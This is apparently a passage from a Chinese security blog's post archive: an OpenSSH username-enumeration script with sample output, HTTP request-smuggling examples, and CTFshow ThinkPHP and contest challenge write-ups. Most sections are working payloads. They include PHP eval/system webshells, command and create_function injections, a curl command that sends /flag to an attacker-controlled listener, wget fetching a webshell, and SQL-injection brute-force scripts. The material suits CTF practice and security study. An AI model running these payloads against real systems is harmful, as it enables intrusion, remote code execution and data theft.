arg_parser.add_mutually_exclusive_group(required=True)\n   group.add_argument('--username', type=str, help=\"The single username to validate\")\n   group.add_argument('--userList', type=str, help=\"The list of usernames (one per line) to enumerate through\")\n   args = arg_parser.parse_args()\n   \n   def main():\n       sock = socket.socket()\n       try:\n           sock.connect((args.hostname, args.port))\n           sock.close()\n       except socket.error:\n           print('[-] Connecting to host failed. Please check the specified host and port.')\n           sys.exit(1)\n   \n       # first we run the function to check if host is vulnerable to this CVE\n       if not checkVulnerable():\n           # most probably the target host is either patched or running a version not affected by this CVE\n           print(\"Target host most probably is not vulnerable or already patched, exiting...\")\n           sys.exit(0)\n       elif args.username: #single username passed in\n           result = checkUsername(args.username)\n           if result[1]:\n               print(result[0]+\" is a valid user!\")\n           else:\n               print(result[0]+\" is not a valid user!\")\n       elif args.userList: #username list passed in\n           try:\n               f = open(args.userList)\n           except IOError:\n               print(\"[-] File doesn't exist or is unreadable.\")\n               sys.exit(3)\n           usernames = map(str.strip, f.readlines())\n           f.close()\n           # map usernames to their respective threads\n           pool = multiprocessing.Pool(args.threads)\n           results = pool.map(checkUsername, usernames)\n           try:\n               if args.outputFile:\n                   outputFile = open(args.outputFile, \"w\")\n           except IOError:\n               print(\"[-] Cannot write to outputFile.\")\n               sys.exit(5)\n           if args.outputFormat=='json':\n               if args.outputFile:\n                   outputFile.writelines(exportJSON(results))\n                   outputFile.close()\n                   print(\"[+] Results successfully written to \" + args.outputFile + \" in JSON form.\")\n               else:\n                   print(exportJSON(results))\n           elif args.outputFormat=='csv':\n               if args.outputFile:\n                   outputFile.writelines(exportCSV(results))\n                   outputFile.close()\n                   print(\"[+] Results successfully written to \" + args.outputFile + \" in CSV form.\")\n               else:\n                   print(exportCSV(results))\n           else:\n               if args.outputFile:\n                   outputFile.writelines(exportList(results))\n                   outputFile.close()\n                   print(\"[+] Results successfully written to \" + args.outputFile + \" in List form.\")\n               else:\n                   print(exportList(results))\n       else: # no usernames passed in\n           print(\"[-] No usernames provided to check\")\n           sys.exit(4)\n   \n   if __name__ == '__main__':\n       main()\n   ```\n\n   此处我们还需要一个用户名字典，可以自行构造，也可以用github上面一个开源项目[SecLists](https://github.com/danielmiessler/SecLists/)，节约时间我们自行构造一个简短list，最终测试结果如下\n\n   ```\n   admin is not a valid user!\n   bin is a valid user!\n   sys is a valid user!\n   sync is a valid user!\n   games is a valid user!\n   man is a valid user!\n   lp is a valid user!\n   111 is not a valid user!\n   1243 is not a valid user!\n   sahdsa is not a valid user!\n   jalba is not a valid user!\n   dsa is not a valid user!\n   fe is not a valid user!\n   qf is not a valid user!\n   ds is not a valid user!\n   vc is not a valid user!\n   dsshg is not a valid user!\n   rsa is not a valid user!\n   grdfsbvfgd is not a valid user!\n   sb is not a valid user!\n   fgd is not a valid user!\n   s is not a valid user!\n   bgfd is not a valid user!\n   s is not a valid user!\n   g is not a valid user!\n   fds is not a valid user!\n   g is not a valid user!\n   fd is not a valid user!\n   sgf is not a valid user!\n   ds is not a valid user!\n   g is not a valid user!\n   fdsh is not a valid user!\n   tr is not a valid user!\n   wnbyrsbf is not a valid user!\n   dgs is not a valid user!\n   root is a valid user!\n   ```\n\n   显然漏洞存在，而当我们对高级版本的SSH进行测试时，exp失效\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206171757123.png)\n\n   \n\n"},{"title":"破破烂烂碎碎知识汇总","url":"/posts/ad1540aa.html","content":"\n## HTTP部分请求头\n\n### Transfer-Encoding\n\n其中中有一类特定编码:chunked编码.该编码将实体分块传送并逐块标明长度,直到长度为0块表示传输结束, 这在实体长度未知时特别有用(比如由数据库动态产生的数据)，该编码格式为\n\n```\nTransfer-Encoding: chunked\\r\\n\n\\r\\n\n16进制表示下一个分块的长度\\r\\n\n要发送的数据\\r\\n\n重复上列数据直到最终结尾使用一个空的数据块来表示内容结束\n0\\r\\n\n\\r\\n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## HTTP请求走私\n\n### 成因\n\n请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为HTTP规范提供了两种不同的方法来指定请求的结束位置，即 `Content-Length` 和 `Transfer-Encoding` 标头。\n\n### 分类\n\n- CLTE：前端服务器使用 `Content-Length` 头，后端服务器使用 `Transfer-Encoding` 头\n- TECL：前端服务器使用 `Transfer-Encoding` 标头，后端服务器使用 `Content-Length` 标头。\n- TETE：前端和后端服务器都支持 `Transfer-Encoding` 标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。\n\n### 攻击方式\n\n1. CL不为0的GET请求\n\n   当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的 `Content-Length` 头，不进行处理。例如下面这个例子：\n\n   ```http\n   GET / HTTP/1.1\\r\\n\n   Host: example.com\\r\\n\n   Content-Length: 44\\r\\n\n   \n   GET /secret HTTP/1.1\\r\\n\n   Host: example.com\\r\\n\n   \\r\\n\n   ```\n\n   这时前端对 `Content-Length` 头进行了处理，将后续伪造的GET请求传入了后端，而后端则没有处理，直接将下面的内容当做了又一个独立请求进行处理\n\n2. 双CL值不同的请求\n\n   根据RFC 7230，当服务器收到的请求中包含两个 `Content-Length` ，而且两者的值不同时，需要返回400错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的 `Content-Length` 值时，就会出现漏洞。例如：\n\n   ```http\n   POST / HTTP/1.1\\r\\n\n   Host: example.com\\r\\n\n   Content-Length: 8\\r\\n\n   Content-Length: 7\\r\\n\n   \n   12345\\r\\n\n   a\n   ```\n\n   这个例子中的a就会被带入到下一个请求中，使得下一个请求变成了\n\n   ```http\n   aGET / HTTP/1.1\\r\\n\n   ```\n\n3. CL-TE\n\n   指前端服务器处理 `Content-Length` 这一请求头，而后端服务器遵守RFC2616的规定，忽略掉 `Content-Length` ，处理 `Transfer-Encoding` 。例如：\n\n   ```http\n   POST / HTTP/1.1\\r\\n\n   Host: example.com\\r\\n\n   Content-Length: 4\\r\\n\n   Transfer-Encoding: chunked\\r\\n\n   \\r\\n\n   12\\r\\n\n   aPOST / HTTP/1.1\\r\\n\n   \\r\\n\n   0\\r\\n\n   \\r\\n\n   ```\n\n   此处前端只处理了 `Content-Length` 这一请求头而忽略了 `Transfer-Encoding` 请求头\n\n4. TE-TE\n\n   指前后端服务器都处理 `Transfer-Encoding` 请求头，但是在容错性上表现不同，例如有的服务器可能会处理 `Transfer-encoding` ，测试例如：\n\n   ```http\n   POST / HTTP/1.1\\r\\n\n   Host: example.com\\r\\n\n   Content-length: 4\\r\\n\n   Transfer-Encoding: chunked\\r\\n\n   Transfer-encoding: cow\\r\\n\n   \\r\\n\n   5c\\r\\n\n   aPOST / HTTP/1.1\\r\\n\n   Content-Type: application/x-www-form-urlencoded\\r\\n\n   Content-Length: 15\\r\\n\n   \\r\\n\n   x=1\\r\\n\n   0\\r\\n\n   \\r\\n\n   ```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## PHP session反序列化\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"CTFshowThinkPHP专题","url":"/posts/80a6314c.html","content":"\n# ThinkPHP\n\n一些ThinkPHP的基础知识：\n\n1. [关于ThinkPHP的模块化设计](https://www.kancloud.cn/manual/thinkphp/1696)\n2. [关于ThinkPHP的闭包支持](https://www.kancloud.cn/manual/thinkphp/1710)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n**569**\n\n知道模块化设计就很简单了\n\n```\n典型访问规则\nhttp://serverName/index.php（或者其他应用入口文件）/模块/控制器/操作/[参数名/参数值...]\n/index.php/Admin/Login/ctfshowLogin\n```\n\n**570**\n\n闭包路由，类似于将/后路径作为参数传入，设定闭包路由的文件在文件根目录/Common/Conf/config.php中\n\n```php\n    'URL_ROUTER_ON'   => true, \n\t'URL_ROUTE_RULES' => array(\n    'ctfshow/:f/:a' =>function($f,$a){\n    \tcall_user_func($f, $a);\n    \t}\n    )\n```\n\n一个明显的后门，payload如下\n\n```\n/index.php/ctfshow/assert/eval($_POST[1])\nPOST:\n1=system('tac /*');\n```\n\n**571**\n\nshow方法导致的命令执行\n\n> ## 渲染内容\n>\n> 如果你没有定义任何模板文件，或者把模板内容存储到数据库中的话，你就需要使用show方法来渲染输出了，show方法的调用格式：\n>\n> ```\n> show('渲染内容'[,'字符编码'][,'输出类型'])例如，$this->show($content);\n> 也可以指定编码和类型： $this->show($content, 'utf-8', 'text/xml');\n> ```\n\n那么我们去看看show方法到底执行了什么\n\n```php\nprotected function show($content,$charset='',$contentType='',$prefix='') {\n    $this->view->display('',$charset,$contentType,$content,$prefix);\n}\n```\n\n往下看调用的display方法\n\n```php\npublic function display($templateFile='',$charset='',$contentType='',$content='',$prefix='') {\n    G('viewStartTime');\n    // 视图开始标签\n    Hook::listen('view_begin',$templateFile);\n    // 解析并获取模板内容\n    $content = $this->fetch($templateFile,$content,$prefix);\n    // 输出模板内容\n    $this->render($content,$charset,$contentType);\n    // 视图结束标签\n    Hook::listen('view_end');\n}\n```\n\n```php\npublic function fetch($templateFile='',$content='',$prefix='') {\n    if(empty($content)) {\n        $templateFile   =   $this->parseTemplate($templateFile);\n        // 模板文件不存在直接返回\n        if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);\n    }else{\n        defined('THEME_PATH') or    define('THEME_PATH', $this->getThemePath());\n    }\n    // 页面缓存\n    ob_start();\n    ob_implicit_flush(0);\n    if('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // 使用PHP原生模板\n        $_content   =   $content;\n        // 模板阵列变量分解成为独立变量\n        extract($this->tVar, EXTR_OVERWRITE);\n        // 直接载入PHP模板\n        empty($_content)?include $templateFile:eval('?>'.$_content);\n    }else{\n        // 视图解析标签\n        $params = array('var'=>$this->tVar,'file'=>$templateFile,'content'=>$content,'prefix'=>$prefix);\n        Hook::listen('view_parse',$params);\n    }\n    // 获取并清空缓存\n    $content = ob_get_clean();\n    // 内容过滤标签\n    Hook::listen('view_filter',$content);\n    // 输出模板文件\n    return $content;\n}\n```\n\n在`TMPL_ENGINE_TYPE=='php'`时，关键就在这句话了`include $templateFile:eval('?>'.$_content);`此处的`$_content`我们是完全可控的，也就可以执行任意命令\n\n而当`TMPL_ENGINE_TYPE!='php'`时，执行的Hook中的listen方法，然后执行exec方法，然后run方法，最后加载并包含一个缓存文件\n\n```php\nstatic public function listen($tag, &$params=NULL) {\n    if(isset(self::$tags[$tag])) {\n        if(APP_DEBUG) {\n            G($tag.'Start');\n            trace('[ '.$tag.' ] --START--','','INFO');\n        }\n        foreach (self::$tags[$tag] as $name) {\n            APP_DEBUG && G($name.'_start');\n            $result =   self::exec($name, $tag,$params);\n            if(APP_DEBUG){\n                G($name.'_end');\n                trace('Run '.$name.' [ RunTime:'.G($name.'_start',$name.'_end',6).'s ]','','INFO');\n            }\n            if(false === $result) {\n                // 如果返回false 则中断插件执行\n                return ;\n            }\n        }\n        if(APP_DEBUG) { // 记录行为的执行日志\n            trace('[ '.$tag.' ] --END-- [ RunTime:'.G($tag.'Start',$tag.'End',6).'s ]','','INFO');\n        }\n    }\n    return;\n}\n```\n\n```\npublic function load($_filename,$vars=null){\n    if(!is_null($vars))\n        extract($vars, EXTR_OVERWRITE);\n    eval('?>'.$this->read($_filename));\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n最终payload\n\n```\n/index.php/Home/Index/index?n=<?php%20system(%27tac%20/*%27);?>\n```\n\n**572**\n\nThinkPHP日志文件\n\n题目中提到了爆破，在thinkphp开启debug的情况下会在Runtime目录下生成log文件，文件的名称是以`年_月_日.log`来命名的。所以我们可以来爆破文件名\n\n```\n/Application/Runtime/Logs/Home/xx_xx_xx.log\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206131917820.png)\n\n扫出了这么个文件，发现似乎传参showctf可执行php代码，拿到flag\n\n**573**\n\n**ThinkPHP 3.2.3sql注入漏洞**\n\n先写个可以调用内置sql查询的主页\n\n```\nclass IndexController extends Controller {\n    public function index(){\n    $a=M('xxx');  //表名\n    $id=I('GET.id');\n    $b=$a->find($id);\n    var_dump($b);\n    }\n}\n```\n\n在I方法中对输入的内容进行过滤，默认过滤器`DEFAULT_FILTER`是不会对单引号做过滤操作的，所以此处不用管，下面走`think_filter`方法，这里对一些敏感安全内容进行了过滤\n\n```php\nfunction think_filter(&$value){\n\t// TODO 其他安全过滤\n\t// 过滤查询特殊字符\n    if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)){\n        $value .= ' ';\n    }\n}\n```\n\nOK，输入检查完毕，我们输入的内容进入到`find`方法中，这里的注释也对我们传入的参数做了详细的解释，下一步进一步跟踪`_parseOptions`方法，继续跟踪`_parseType`方法，该方法对内容类型进行解析\n\n```php\n/**\n * 查询数据\n * @access public\n * @param mixed $options 表达式参数\n * @return mixed\n */\n```\n\n```\nif(is_scalar($val)) {\n    $this->_parseType($options['where'],$key);\n}\n```\n\n```\nelseif(false === strpos($fieldType,'bigint') && false !== strpos($fieldType,'int')) {\n                $data[$key]   =  intval($data[$key]);\n```\n\n\n\n\n\n先放一个yu师傅的[代码审计](https://blog.csdn.net/miuzzx/article/details/119424071)，以后再回来看\n\n**574**\n"},{"title":"大佬文章合集","url":"/posts/f85e0a9a.html","content":"\n### [[CTF]PHP反序列化总结](https://blog.csdn.net/solitudi/article/details/113588692?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen)\n\n### [[CTF].htaccess的使用技巧总结](https://blog.csdn.net/solitudi/article/details/116666720)\n\n### [Web安全学习笔记](https://websec.readthedocs.io/zh/latest/index.html)\n\n### [Java Web安全](https://javasec.org)\n\n### [反弹shell命令生成器](https://www.revshells.com)\n\n### [PHP中SESSION反序列化机制](https://blog.spoock.com/2016/10/16/php-serialize-problem/)\n\n\n\n"},{"title":"CTFshow大赛原题","url":"/posts/76fe6b8e.html","content":"\n**680**\n\npost传入`code=phpinfo();`执行成功，查看被ban函数，无法执行命令，使用原生类查看文件\n\n```\ncode=$a=new FilesystemIterator(\".\");var_dump ($a);\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206090028188.png)\n\n下载文件即可\n\n**681**\n\n抓包发现返回内容为sql语句\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206090039242.png)\n\n过滤了空格和引号，会被吞，尝试构造payload，发现#可用，\\可用，构造语句`||1#\\`此时执行语句为\n\n```sql\nselect count(*) from ctfshow_users where username = '||1#\\' or nickname = '||1#\\'\n```\n\n相当于判断username是否等于`||1' or nickname = `这一字符串或一，结果永真，登录即可拿到flag\n\n**682**\n\n这辈子第一次碰到js代码审计，看呗\n\n```javascript\nvar c2n  = c =>{\n    if(c.length>1){\n        return 0\n    }\n\n    if(c.charCodeAt()>0x60 && c.charCodeAt()<0x67){\n        return c.charCodeAt()-0x57\n    }\n\n    if(parseInt(c)>0){\n        return parseInt(c)\n    }\n\n    return 0;\n}\n\nvar s2n2su = s =>{\n    r=0\n    for (var i = s.length - 1; i >= 0; i--) {\n        r+=c2n(s[i])\n    }\n    return r\n}\n\nfunction test(){\n    var m=document.getElementById(\"message\").value;\n    var e = 'error';\n    if(sha256(m)!==\"e3a331710b01ff3b3e34d5f61c2c9e1393ccba3e31f814e7debd537c97ed7d3d\"){\n        return alert(e)\n    }\n    var start = m.substring(0,8);\n\n    if(start!=='ctfshow{'){\n        return alert(e);\n    }\n    if(m.substring(m.length,m.length-1)!==\"}\"){\n        return alert(e);\n    }\n    var s = m.substring(8,m.length-1)\n    if(s.length!==36){\n        return alert(e);\n    }\n    var k = s.split(\"-\")\n    if(k.length!==5){\n        return alert(e)\n    }\n    if(s2n2su(k[0])!==63){\n        return alert(e)\n    }\n    if(sha256(k[0].substr(0,4))!==\"c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400\"){\n        return alert(e)\n    }\n\n    if(sha256(k[0].substr(4,8))!==\"f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc\"){\n        return alert(e)\n    }\n\n\n\n    if(parseInt(k[1][0])!==(c2n('a')-1)){\n        return alert(e)\n    }\n\n    if(k[1][1]+k[1][2]+k[1][3]!=='dda'){\n        return alert(e)\n    }\n\n    if(k[2][1]!=='e'){\n        return alert(e)\n    }\n\n    if(k[2][0]+k[2][2]+k[2][3]!=0x1ae){\n        return alert(e)\n    }\n\n\n    if(parseInt(k[3][0])!==(c2n('a')-1)){\n        return alert(e)\n    }\n\n    if(parseInt(k[3][1])!==parseInt(k[3][3])){\n        return alert(e)\n    }\n\n    if(parseInt(k[3][3])*2+c2n('a')!==0x12){\n        return alert(e)\n    }\n\n    if(sha224(k[3][2])!=='abd37534c7d9a2efb9465de931cd7055ffdb8879563ae98078d6d6d5'){\n        return alert(e)\n    }\n\n    if(st3(k[4])!=='GVSTMNDGGQ2DSOLBGUZA===='){\n        return alert(e)\n    }\n\n    alert('you are right')\n}\n\n\n\n\nconst Base64 = {\n    _keyStr: \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\",\n    encode: function (e) {\n        var t = \"\";\n        var n, r, i, s, o, u, a;\n        var f = 0;\n        e = Base64._utf8_encode(e);\n        while (f < e.length) {\n            n = e.charCodeAt(f++);\n            r = e.charCodeAt(f++);\n            i = e.charCodeAt(f++);\n            s = n >> 2;\n            o = (n & 3) << 4 | r >> 4;\n            u = (r & 15) << 2 | i >> 6;\n            a = i & 63;\n            if (isNaN(r)) {\n                u = a = 64\n            } else if (isNaN(i)) {\n                a = 64\n            }\n            t = t + this._keyStr.charAt(s) + this._keyStr.charAt(o) + this._keyStr.charAt(u) + this._keyStr.charAt(a)\n        }\n        return t\n    },\n    decode: function (e) {\n        var t = \"\";\n        var n, r, i;\n        var s, o, u, a;\n        var f = 0;\n        e = e.replace(/[^A-Za-z0-9+/=]/g, \"\");\n        while (f < e.length) {\n            s = this._keyStr.indexOf(e.charAt(f++));\n            o = this._keyStr.indexOf(e.charAt(f++));\n            u = this._keyStr.indexOf(e.charAt(f++));\n            a = this._keyStr.indexOf(e.charAt(f++));\n            n = s << 2 | o >> 4;\n            r = (o & 15) << 4 | u >> 2;\n            i = (u & 3) << 6 | a;\n            t = t + String.fromCharCode(n);\n            if (u != 64) {\n                t = t + String.fromCharCode(r)\n            }\n            if (a != 64) {\n                t = t + String.fromCharCode(i)\n            }\n        }\n        t = Base64._utf8_decode(t);\n        return t\n    },\n    _utf8_encode: function (e) {\n        e = e.replace(/rn/g, \"n\");\n        var t = \"\";\n        for (var n = 0; n < e.length; n++) {\n            var r = e.charCodeAt(n);\n            if (r < 128) {\n                t += String.fromCharCode(r)\n            } else if (r > 127 && r < 2048) {\n                t += String.fromCharCode(r >> 6 | 192);\n                t += String.fromCharCode(r & 63 | 128)\n            } else {\n                t += String.fromCharCode(r >> 12 | 224);\n                t += String.fromCharCode(r >> 6 & 63 | 128);\n                t += String.fromCharCode(r & 63 | 128)\n            }\n        }\n        return t\n    },\n    _utf8_decode: function (e) {\n        var t = \"\";\n        var n = 0;\n        var r = c1 = c2 = 0;\n        while (n < e.length) {\n            r = e.charCodeAt(n);\n            if (r < 128) {\n                t += String.fromCharCode(r);\n                n++\n            } else if (r > 191 && r < 224) {\n                c2 = e.charCodeAt(n + 1);\n                t += String.fromCharCode((r & 31) << 6 | c2 & 63);\n                n += 2\n            } else {\n                c2 = e.charCodeAt(n + 1);\n                c3 = e.charCodeAt(n + 2);\n                t += String.fromCharCode((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);\n                n += 3\n            }\n        }\n        return t\n    }\n}\n\n\n\nfunction st3(srcString) {\n    if (!srcString) {\n        return '';\n    }\n\n    let BASE32CHAR = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567\";\n    let i = 0;\n    let index = 0;\n    let digit = 0;\n    let currByte;\n    let nextByte;\n    let retrunString = '';\n    srcString = Base64._utf8_encode(srcString);\n\n    for (let i = 0; i < srcString.length;) {\n        currByte = (srcString.charCodeAt(i) >= 0) ? srcString.charCodeAt(i)\n            : (srcString.charCodeAt(i) + 256);\n\n        if (index > 3) {\n            if ((i + 1) < srcString.length) {\n                nextByte = (srcString.charCodeAt(i + 1) >= 0)\n                    ? srcString.charCodeAt(i + 1)\n                    : (srcString.charCodeAt(i + 1) + 256);\n            } else {\n                nextByte = 0;\n            }\n\n            digit = currByte & (0xFF >> index);\n            index = (index + 5) % 8;\n            digit <<= index;\n            digit |= (nextByte >> (8 - index));\n            i++;\n        } else {\n            digit = (currByte >> (8 - (index + 5))) & 0x1F;\n            index = (index + 5) % 8;\n\n            if (index == 0) {\n                i++;\n            }\n        }\n\n        retrunString = retrunString + BASE32CHAR.charAt(digit);\n    }\n    while((retrunString.length % 8) !== 0){\n        retrunString += \"=\";\n    }\n    return retrunString;\n}\n```\n\n分析代码，要求flag符合下列条件\n\n1. 前八位为字符串`ctfshow{`，结尾为`}`\n2. flag经过sha256运算的结果为`e3a331710b01ff3b3e34d5f61c2c9e1393ccba3e31f814e7debd537c97ed7d3d`\n3. 中间内容长度为36，有4个UUID分块`-`\n4. c2n函数的作用：将UUID中的内容转换为10进制数\n5. s2n2su函数的作用：将UUID中每一位的数字相加并返回最终的值\n6. 第一个UUID分段的UUID和值为63\n7. 第一个UUID分段的前四位经过sha256运算后的结果是`c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400`，结果为`592b`\n8. 第一个UUID分段后4位经过sha256运算后的结果是`f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc`，结果为`9d77`\n9. 第二个UUID分段是`9dda`\n10. 第三个UUID的第二位是e，并且剩余三位的连接后为430\n11. 第四个UUID为`94a4`\n12. 第五个UUID经过base32编码结果为`GVSTMNDGGQ2DSOLBGUZA====`\n\n最终构造出flag\n\n```\nctfshow{592b9d77-9dda-4e30-94a4-5e64f4499a52}\n```\n\n顺便贴个爆破脚本\n\n```python\nimport hashlib\nfrom itertools import *\nstring=\"0123456789abcdef\"\nk=product(string,repeat=4)\nfor i in k:\n    aaa=\"\".join(i)\n    out1 = hashlib.sha256(aaa.encode(\"utf-8\")).hexdigest()\n    if(out1=='c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400'):\n        print(aaa)\n    if(out1=='f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc'):\n        print(aaa)\n```\n\n**683**\n\n明显的弱类型比较\n\n```php\n<?php \n   include \"flag.php\"; \n   if(isset($_GET['秀'])){ \n       if(!is_numeric($_GET['秀'])){ \n          die('必须是数字'); \n       }else if($_GET['秀'] < 60 * 60 * 24 * 30 * 2){ \n          die('你太短了'); \n       }else if($_GET['秀'] > 60 * 60 * 24 * 30 * 3){ \n           die('你太长了'); \n       }else{ \n           sleep((int)$_GET['秀']); \n           echo $flag; \n       } \n   } \n```\n\n自动转换时xex会被转换为原始数字，int强制转换string时取到字母停止\n\n```\npayload:?秀=0.6e7\n```\n\n**684**\n\n源码在此\n\n```php\n<?php\n$action = $_GET['action'] ?? '';\n$arg = $_GET['arg'] ?? '';\n\nif(preg_match('/^[a-z0-9_]*$/isD', $action)) {\n    show_source(__FILE__);\n} else {\n    $action('', $arg);\n}\n```\n\n变量$action要出现数字字母以外的字符，还要执行函数，使用\\create_function，这里利用的是php环境中默认的namespace\n\n> php里默认命名空间是\\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 接下来第二个参数可以引发危险的函数。\n\n> create_function()是PHP中的内置函数，用于在PHP中创建匿名(lambda-style)函数。\n>\n> **用法:**\n>\n> ```\n> string create_function ( $args, $code )\n> ```\n>\n> **参数：**该函数接受以下两个参数：\n>\n> - **$args:**它是一个字符串类型的函数参数。\n> - **$code:**它是字符串类型的函数代码。\n>\n> **注意：**通常，这些参数将作为单引号分隔的字符串传递。使用单引号引起来的字符串的原因是为了防止变量名被解析，否则，将需要双引号来转义变量名，例如\\ $avar。\n>\n> **返回值：**此函数以字符串形式返回唯一的函数名称，否则，在错误时返回FALSE。\n\n而对于create_function函数来说，实际执行的内容如下\n\n```\nfunction noname($args) { $code }\n```\n\n结尾我们使用}闭合，最终的payload如下\n\n```\npayload:?action=%5ccreate_function&arg=}system('tac /secret_you_never_know');/*\n```\n\n**685**\n\n利用正则最大回溯次数绕过\n\n> PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit\n> 回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过正则表达式了。\n\n```python\nimport requests\nurl=\"http://b826efef-6cde-4fa8-84d3-4cb699605ab2.challenge.ctf.show\"\nfiles={\n\t'file':'<?php eval($_POST[1]);?>'+'b'*1000000\n}\nr=requests.post(url,files=files)\nprint(r.text)\n```\n\n**686**\n\n无参RCE\n\n```\npayload:?code=system(current(getallheaders()));\nX-Forwarded-Host: cat /secret_you_never_know\n```\n\n**687**\n\n换行执行命令\n\n```\npayload:?ip=1%0atac /flaaag\n```\n\n**688**\n\n俩函数一起用有的问题\n\n`escapeshellarg();\nescapeshellcmd();`\n\n```\npayload:?url=http://监听使用的ip:port/' -F file=@/flag'\n```\n\n实际传入shell的是\n\n```shell\ncurl 'http://IP:端口/'\\\\'' -F file=@/flag'\\\\'''\n```\n\n直接带出文件\n\n**689**\n\n```php\n<?php \nerror_reporting(0);\nif(isset($_GET) && !empty($_GET)){\n    $url = $_GET['file'];\n    $path = \"upload/\".$_GET['path'];\n    \n}else{\n    show_source(__FILE__);\n    exit();\n}\n\nif(strpos($path,'..') > -1){\n    die('This is a waf!');\n}\n\n\nif(strpos($url,'http://127.0.0.1/') === 0){\n    file_put_contents($path, file_get_contents($url));\n    echo \"console.log($path update successed!)\";\n}else{\n    echo \"Hello.CTFshow\";\n}\n```\n\n这里在path位置没有过滤，也就是说不管我们在path位置写入什么都会原封不动的返回，所以此时我们让docker访问自己，在path处传入木马即可\n\n```\nhttp://f784bf7a-ace9-414a-bbfd-cfd348cefd95.challenge.ctf.show/?file=http://127.0.0.1/?file=http://127.0.0.1/%26path=%3C?php%20eval($_POST[1]);?%3E&path=b.php\n```\n\n**690**\n\n```php\n<?php \nhighlight_file(__FILE__);\nerror_reporting(0);\n$args = $_GET['args'];\nfor ( $i=0; $i<count($args); $i++ ){\n    if ( !preg_match('/^\\w+$/', $args[$i]) )\n        exit(\"sorry\");\n}\n\nexec('./ ' . implode(\" \", $args));\n```\n\n传入的命令中只能有字母和数字，执行命令可用换行绕过，问题是我们要如何构造命令来执行，首先因为没有回显，所以直接执行是行不通的，那可以尝试写一个文件，构造一个服务器返回内容为一句话木马的脚本\n\n```\n\n\n```\n\n构造如下命令\n\n```\nmkdir a\ncd a\nwget 10进制服务器IP\n```\n\n此时a文件夹下就有一个index.html内容为一句话木马，但是我们还没办法执行，此时我们利用tar来将文件类型进行更改\n\n```\ntar cvf shell a\n```\n\n将a文件夹打包成一个shell文件就可以执行了\n\n**691**\n\n```php\n<?php\ninclude('inc.php');\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction   filter($str){\n      $filterlist = \"/\\(|\\)|username|password|where|\n      case|when|like|regexp|into|limit|=|for|;/\";\n      if(preg_match($filterlist,strtolower($str))){\n        die(\"illegal input!\");\n      }\n      return $str;\n  }\n$username = isset($_POST['username'])?\nfilter($_POST['username']):die(\"please input username!\");\n$password = isset($_POST['password'])?\nfilter($_POST['password']):die(\"please input password!\");\n$sql = \"select * from admin where  username =\n '$username' and password = '$password' \";\n$res = $conn -> query($sql);\nif($res->num_rows>0){\n  $row = $res -> fetch_assoc();\n  if($row['id']){\n     echo $row['username'];\n  }\n}else{\n   echo \"The content in the password column is the flag!\";\n}\n?>\n```\n\norder by盲注，贴个[链接](https://blog.csdn.net/miuzzx/article/details/104908543)，原理就是通过password位置的字符串的比较导致回显中username的内容不同来判断结果，直接写脚本吧\n\n```python\nimport requests\nflagstr=\"-01234567890abcdefghiostw{}---\"\nurl=\"http://9446af78-f5bd-4d30-94b4-05dc5eb8f887.challenge.ctf.show/\"\nflag=\"\"\nfor i in range(0,100):\n    for j in range(1,len(flagstr)):\n        tmp=flag+flagstr[j]\n        data={'username':f\"'or 1 union select 1,2,'{tmp}' order by 3#\",\"password\":\"1\"}\n        tex=requests.post(url=url,data=data).text\n        if \"</code>admin\" in tex:\n            print(flag+flagstr[j-1])\n            flag=flag+flagstr[j-1]\n            break\n```\n\n**692**\n\n看一下preg_replace函数的用法\n\n> # preg_replace\n>\n> (PHP 4, PHP 5, PHP 7, PHP 8)\n>\n> preg_replace — 执行一个正则表达式的搜索和替换\n>\n> ### 说明\n>\n> ```\n> preg_replace(\n>   string|array $pattern,\n>   string|array $replacement,\n>   string|array $subject,\n>   int $limit = -1,\n>   int &$count = null\n> ): string|array|null\n> ```\n>\n> 搜索 `subject` 中匹配 `pattern` 的部分，以 `replacement` 进行替换。\n>\n> ```\n> replacement\n> ```\n>\n> 用于替换的字符串或字符串数组。如果这个参数是一个字符串，并且 `pattern` 